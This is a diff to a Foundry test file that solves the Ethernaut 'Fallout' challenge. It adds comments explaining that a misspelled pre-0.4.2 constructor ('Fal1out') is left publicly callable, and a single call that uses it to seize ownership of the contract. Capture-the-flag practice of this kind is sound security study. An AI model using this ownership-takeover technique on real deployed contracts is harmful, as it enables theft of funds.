@@ -32,8 +32,15 @@ contract TestFallout is BaseTest {
 
     function exploitLevel() internal override {
         /** CODE YOUR EXPLOIT HERE */
+
         vm.startPrank(player);
+
+        // Before solidity 0.4.2 there was no constructor keyword in solidity so in order to make a constructor fn,
+        // a fn should be defined with the same name as the name of the contract
+        // In this challenge, there is a typo, instead of Fallout dev named it Fal1out
+        // allowing the fn to be called unlimited number of times and claiming ownership of the contract
         level.Fal1out();
+
         vm.stopPrank();
     }
 }
